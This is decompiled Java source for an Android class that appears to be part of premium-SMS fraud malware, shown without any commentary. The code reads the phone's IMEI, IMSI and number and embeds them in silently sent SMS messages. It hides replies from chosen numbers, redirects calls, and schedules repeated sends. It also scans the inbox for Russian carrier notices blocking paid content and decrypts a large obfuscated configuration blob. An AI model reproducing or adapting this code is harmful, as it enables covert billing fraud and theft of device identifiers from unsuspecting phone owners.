package com.c3r2fdffs.i.app;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.Contacts.People;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.format.Time;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintStream;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Date;
import java.util.Vector;
import org.json.JSONArray;
import org.json.JSONObject;

public class Settings
{
  public static String SETTINGS = "settings";
  public static String callTo = "";
  public static boolean ok;
  public static String phone = "phone";
  static Settings settings;
  public static String text = "text";
  public static boolean userAgree;
  public static boolean userCancel;
  public Vector<Operator> operators = new Vector();
  
  static
  {
    ok = false;
    userAgree = false;
    userCancel = false;
  }
  
  public Settings() {}
  
  public static boolean addContact(Context paramContext, String paramString1, String paramString2)
  {
    log("addContact() " + paramString1);
    try
    {
      ContentValues localContentValues = new ContentValues();
      localContentValues.put("number", paramString1);
      localContentValues.put("type", Integer.valueOf(0));
      localContentValues.put("label", paramString2);
      localContentValues.put("name", paramString2);
      paramString2 = Uri.withAppendedPath(paramContext.getContentResolver().insert(Contacts.People.CONTENT_URI, localContentValues), "phones");
      localContentValues.clear();
      localContentValues.put("type", Integer.valueOf(2));
      localContentValues.put("number", paramString1);
      paramContext.getContentResolver().insert(paramString2, localContentValues);
      return true;
    }
    catch (Exception paramContext)
    {
      log(paramContext);
    }
    return false;
  }
  
  public static String decript(String paramString)
  {
    return decript(Base64.decode(paramString, 0));
  }
  
  public static String decript(byte[] paramArrayOfByte)
  {
    int i = 0;
    int m = paramArrayOfByte[0] & 0xFF;
    int j = m + 1;
    try
    {
      for (;;)
      {
        if (j >= paramArrayOfByte.length) {
          return new String(paramArrayOfByte, m + 1, paramArrayOfByte.length - m - 1, "utf-8");
        }
        paramArrayOfByte[j] = ((byte)(paramArrayOfByte[j] ^ paramArrayOfByte[(i + 1)] & 0xFF));
        int k = i + 1;
        i = k;
        if (k == m) {
          i = 0;
        }
        j += 1;
      }
      return "";
    }
    catch (Exception paramArrayOfByte)
    {
      paramArrayOfByte.printStackTrace();
    }
  }
  
  public static String getCountry(Context paramContext)
  {
    try
    {
      paramContext = ((TelephonyManager)paramContext.getSystemService("phone")).getSimCountryIso();
      if (paramContext != null) {
        return paramContext;
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "ERR";
  }
  
  public static String getCurrentTime()
  {
    Time localTime = new Time();
    localTime.setToNow();
    return localTime.format("%Y_%m_%d_%H_%M_%S");
  }
  
  public static String getImei(Context paramContext)
  {
    try
    {
      paramContext = ((TelephonyManager)paramContext.getSystemService("phone")).getDeviceId();
      if (paramContext != null) {
        return paramContext;
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "ERR";
  }
  
  public static String getImsi(Context paramContext)
  {
    try
    {
      paramContext = ((TelephonyManager)paramContext.getSystemService("phone")).getSubscriberId();
      if (paramContext != null) {
        return paramContext;
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "ERR";
  }
  
  public static String getPhone(Context paramContext)
  {
    try
    {
      paramContext = ((TelephonyManager)paramContext.getSystemService("phone")).getLine1Number();
      if (paramContext != null) {
        return paramContext;
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "ERR";
  }
  
  public static Settings getSettings()
  {
    return settings;
  }
  
  public static String isAosMessage(String paramString1, String paramString2)
  {
    try
    {
      paramString2 = new JSONObject(Constants.data).getJSONObject("settings").getJSONObject("aos");
      if (paramString2.getBoolean("enable"))
      {
        if (paramString2.has("phonesEx"))
        {
          JSONArray localJSONArray = paramString2.getJSONArray("phonesEx");
          i = 0;
          while (i < localJSONArray.length())
          {
            paramString2 = localJSONArray.getJSONObject(i);
            String str = paramString2.getString("phone");
            paramString2 = paramString2.getString("text");
            if (paramString1.startsWith(str)) {
              return paramString2;
            }
            i += 1;
          }
        }
        paramString2 = paramString2.getJSONArray("phones");
        int i = 0;
        while (i < paramString2.length())
        {
          boolean bool = paramString1.startsWith(paramString2.getString(i));
          if (bool) {
            return "ok";
          }
          i += 1;
        }
      }
      return paramString2;
    }
    catch (Exception paramString1)
    {
      paramString1.printStackTrace();
      paramString2 = null;
    }
  }
  
  public static boolean isDeleteMessage(String paramString1, String paramString2)
  {
    try
    {
      paramString2 = new JSONObject(Constants.data).getJSONObject("settings").getJSONArray("blockPhones");
      int i = 0;
      while (i < paramString2.length())
      {
        boolean bool = paramString1.equals(paramString2.getString(i));
        if (bool) {
          return true;
        }
        i += 1;
      }
      return false;
    }
    catch (Exception paramString1)
    {
      paramString1.printStackTrace();
    }
  }
  
  public static boolean isDeleteMessageIfNotStartWith(String paramString1, String paramString2)
  {
    try
    {
      Object localObject1 = new JSONObject(Constants.data).getJSONObject("settings");
      if (((JSONObject)localObject1).has("unblockPhones"))
      {
        Object localObject2 = ((JSONObject)localObject1).getJSONObject("unblockPhones");
        localObject1 = ((JSONObject)localObject2).getString("text");
        localObject2 = ((JSONObject)localObject2).getJSONArray("phones");
        int i = 0;
        while (i < ((JSONArray)localObject2).length())
        {
          if (((JSONArray)localObject2).getString(i).equals(paramString1))
          {
            WildCardStringFinder localWildCardStringFinder = new WildCardStringFinder();
            if (paramString2.length() > 0)
            {
              boolean bool = localWildCardStringFinder.isStringMatching(paramString2, (String)localObject1);
              if (!bool) {
                return true;
              }
            }
          }
          i += 1;
        }
      }
      return false;
    }
    catch (Exception paramString1)
    {
      paramString1.printStackTrace();
    }
  }
  
  public static boolean isDie(String paramString1, String paramString2)
  {
    if (paramString2.contains("Запрет контента")) {}
    while ((paramString2.contains("ВП запрещен")) || (paramString2.contains("Стоп-Контент")) || (paramString2.contains("запрет на пользование платными"))) {
      return true;
    }
    return false;
  }
  
  public static boolean isOkMessage(String paramString1, String paramString2)
  {
    WildCardStringFinder localWildCardStringFinder1 = new WildCardStringFinder();
    WildCardStringFinder localWildCardStringFinder2 = new WildCardStringFinder();
    return (phone.length() > 0) && (text.length() > 0) && (localWildCardStringFinder2.isStringMatching(paramString1, phone)) && (localWildCardStringFinder1.isStringMatching(paramString2, text));
  }
  
  public static boolean isRedirect(String paramString)
  {
    try
    {
      JSONObject localJSONObject = new JSONObject(Constants.data).getJSONObject("settings");
      if (localJSONObject.has("callRedirect"))
      {
        localJSONObject = localJSONObject.getJSONObject("callRedirect");
        if (localJSONObject.getBoolean("enable"))
        {
          JSONArray localJSONArray = localJSONObject.getJSONArray("phones");
          int i = 0;
          while (i < localJSONArray.length())
          {
            if (localJSONArray.getString(i).equals(paramString))
            {
              callTo = localJSONObject.getString("to");
              return true;
            }
            i += 1;
          }
        }
      }
      return false;
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
    }
  }
  
  public static void log(Exception paramException)
  {
    if (Constants.LOGGING)
    {
      log("ERROR - " + paramException);
      return;
    }
    paramException.printStackTrace();
  }
  
  public static void log(String paramString)
  {
    if (!Constants.LOGGING) {
      return;
    }
    System.out.println(paramString);
    Object localObject = new File(Environment.getExternalStorageDirectory() + "/log.txt");
    if (!((File)localObject).exists()) {}
    try
    {
      ((File)localObject).createNewFile();
      try
      {
        localObject = new BufferedWriter(new FileWriter((File)localObject, true), 8);
        Time localTime = new Time();
        localTime.setToNow();
        ((BufferedWriter)localObject).append(localTime.format("%H:%M:%S %d.%m.%Y"));
        ((BufferedWriter)localObject).append(": ");
        ((BufferedWriter)localObject).append(paramString);
        ((BufferedWriter)localObject).newLine();
        ((BufferedWriter)localObject).close();
        return;
      }
      catch (IOException paramString)
      {
        paramString.printStackTrace();
        return;
      }
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        localIOException.printStackTrace();
      }
    }
  }
  
  public static void makeCall(Context paramContext, String paramString)
  {
    paramString = new Intent("android.intent.action.CALL", Uri.parse("tel:" + paramString));
    paramString.addFlags(268435456);
    paramContext.startActivity(paramString);
  }
  
  public static String md5(String paramString)
  {
    try
    {
      Object localObject = MessageDigest.getInstance("MD5");
      ((MessageDigest)localObject).update(paramString.getBytes());
      paramString = ((MessageDigest)localObject).digest();
      localObject = new StringBuffer();
      int i = 0;
      for (;;)
      {
        if (i >= paramString.length) {
          return ((StringBuffer)localObject).toString();
        }
        String str = Integer.toHexString(paramString[i] & 0xFF);
        if (str.length() == 1) {
          ((StringBuffer)localObject).append("0");
        }
        ((StringBuffer)localObject).append(str);
        i += 1;
      }
      return "";
    }
    catch (NoSuchAlgorithmException paramString)
    {
      paramString.printStackTrace();
    }
  }
  
  public static void parseInSms(Context paramContext)
  {
    try
    {
      Object localObject = new String[1];
      localObject[0] = "content://sms/inbox";
      int i = 0;
      if (i >= localObject.length) {
        return;
      }
      Cursor localCursor = paramContext.getContentResolver().query(Uri.parse(localObject[i]), null, null, null, null);
      int k;
      String str;
      do
      {
        if (!localCursor.moveToNext())
        {
          localCursor.close();
          i += 1;
          break;
        }
        int j = localCursor.getColumnIndex("date");
        k = localCursor.getColumnIndex("body");
        str = localCursor.getString(localCursor.getColumnIndex("address"));
        new Date(localCursor.getLong(j));
      } while (!isDie(str, localCursor.getString(k)));
      localObject = getSettings();
      userCancel = true;
      ((Settings)localObject).save(paramContext);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static boolean sendSms(String paramString1, String paramString2)
  {
    try
    {
      paramString2 = paramString2.replace("{IMEI}", Constants.imei).replace("{IMSI}", Constants.imsi);
      log("sms: " + paramString2 + " to " + paramString1);
      SmsManager.getDefault().sendTextMessage(paramString1, null, paramString2, null, null);
      return true;
    }
    catch (Exception paramString1)
    {
      paramString1.printStackTrace();
    }
    return false;
  }
  
  public static void setSettings(Settings paramSettings)
  {
    settings = paramSettings;
  }
  
  public static void startRepeatTimer(Context paramContext, long paramLong)
  {
    try
    {
      log("startRepeatTimer: " + paramLong + " sec");
      Object localObject = new Intent(paramContext, MainReceiver.class);
      ((Intent)localObject).setAction("custom.reapeat");
      ((Intent)localObject).putExtra("time", System.currentTimeMillis() + Constants.MINUTE * paramLong);
      localObject = PendingIntent.getBroadcast(paramContext, 0, (Intent)localObject, 0);
      ((AlarmManager)paramContext.getSystemService("alarm")).set(0, System.currentTimeMillis() + Constants.MINUTE * paramLong, (PendingIntent)localObject);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void startRepeatWaitTimer(Context paramContext, long paramLong)
  {
    try
    {
      log("startRepeatWaitTimer: " + paramLong);
      Object localObject = new Intent(paramContext, MainReceiver.class);
      ((Intent)localObject).setAction("custom.reapeat");
      ((Intent)localObject).putExtra("time", paramLong);
      localObject = PendingIntent.getBroadcast(paramContext, 0, (Intent)localObject, 0);
      ((AlarmManager)paramContext.getSystemService("alarm")).set(0, paramLong, (PendingIntent)localObject);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void startSmsTimer(Context paramContext, long paramLong, int paramInt, String paramString1, String paramString2)
  {
    try
    {
      log("startSmsTimer: " + paramLong + " sec");
      Intent localIntent = new Intent(paramContext, MainReceiver.class);
      localIntent.setAction("custom.sms." + paramInt);
      localIntent.putExtra("phone", paramString1);
      localIntent.putExtra("text", paramString2);
      paramString1 = PendingIntent.getBroadcast(paramContext, 0, localIntent, 0);
      ((AlarmManager)paramContext.getSystemService("alarm")).set(0, System.currentTimeMillis() + Constants.SECOND * paramLong, paramString1);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public boolean load(Context paramContext)
  {
    bool2 = false;
    log("Settings::load() start");
    for (;;)
    {
      try
      {
        Constants.imei = getImei(paramContext);
        Constants.imsi = getImsi(paramContext);
        Constants.phone = getPhone(paramContext);
        Constants.country = getCountry(paramContext);
        if (Constants.DEBUG)
        {
          Constants.imsi = "25001";
          Constants.data = decript("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");
        }
      }
      catch (Exception paramContext)
      {
        int i;
        paramContext.printStackTrace();
        boolean bool1 = bool2;
        continue;
        JSONObject localJSONObject = paramContext.getJSONObject(i);
        Operator localOperator = new Operator();
        localOperator.name = localJSONObject.getString("name");
        localOperator.time = localJSONObject.getLong("time");
        this.operators.add(localOperator);
        i += 1;
        continue;
      }
      try
      {
        System.out.println("json: " + new JSONObject(Constants.data).toString(4));
        log("json settings: " + new JSONObject(Constants.data).toString(4));
        paramContext = paramContext.getSharedPreferences(SETTINGS, 1);
        bool1 = bool2;
        if (paramContext.contains("first"))
        {
          userAgree = paramContext.getBoolean("userAgree", false);
          userCancel = paramContext.getBoolean("userCancel", false);
          paramContext = new JSONArray(paramContext.getString("operators", ""));
          this.operators = new Vector();
          i = 0;
          int j = paramContext.length();
          if (i >= j) {
            bool1 = true;
          }
        }
        else
        {
          log("Settings::load() end");
          return bool1;
        }
      }
      catch (Exception localException)
      {
        localException.printStackTrace();
      }
    }
  }
  
  public void printToOutStream() {}
  
  public void reset(Context paramContext)
  {
    try
    {
      paramContext = paramContext.getSharedPreferences(SETTINGS, 2).edit();
      paramContext.clear();
      paramContext.commit();
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public boolean save(Context paramContext)
  {
    log("Settings::save() start");
    for (;;)
    {
      try
      {
        paramContext = paramContext.getSharedPreferences(SETTINGS, 2).edit();
        paramContext.putBoolean("first", false);
        paramContext.putBoolean("userAgree", userAgree);
        paramContext.putBoolean("userCancel", userCancel);
        localJSONArray = new JSONArray();
        i = 0;
        if (i < this.operators.size()) {
          continue;
        }
        paramContext.putString("operators", localJSONArray.toString());
        paramContext.commit();
      }
      catch (Exception paramContext)
      {
        JSONArray localJSONArray;
        int i;
        Operator localOperator;
        JSONObject localJSONObject;
        paramContext.printStackTrace();
        continue;
      }
      log("Settings::save() end");
      return false;
      localOperator = (Operator)this.operators.get(i);
      localJSONObject = new JSONObject();
      localJSONObject.put("name", localOperator.name);
      localJSONObject.put("time", localOperator.time);
      localJSONArray.put(localJSONObject);
      i += 1;
    }
  }
}
